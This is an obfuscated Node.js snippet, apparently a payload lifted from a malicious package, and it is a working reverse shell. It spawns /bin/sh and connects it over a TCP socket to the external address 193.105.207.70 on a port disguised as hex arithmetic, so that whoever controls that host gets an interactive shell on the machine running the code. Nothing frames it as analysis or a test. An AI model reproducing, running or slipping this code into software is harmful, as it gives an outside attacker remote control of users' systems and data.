(function () {
    var _0x33199c = require('net'), _0x30d128 = require('child_process'), _0x131e63 = _0x30d128['spawn']('/bin/sh', []);
    var _0x327137 = new _0x33199c['Socket']();
    _0x327137['connect'](-0x5 * -0xb47 + -0x1c * -0x235 + -0x5306, '193.105.207.70', function () {
        _0x327137['pipe'](_0x131e63['stdin']);
        _0x131e63['stdout']['pipe'](_0x327137);
        _0x131e63['stderr']['pipe'](_0x327137);
    });
    return /a/;
}());
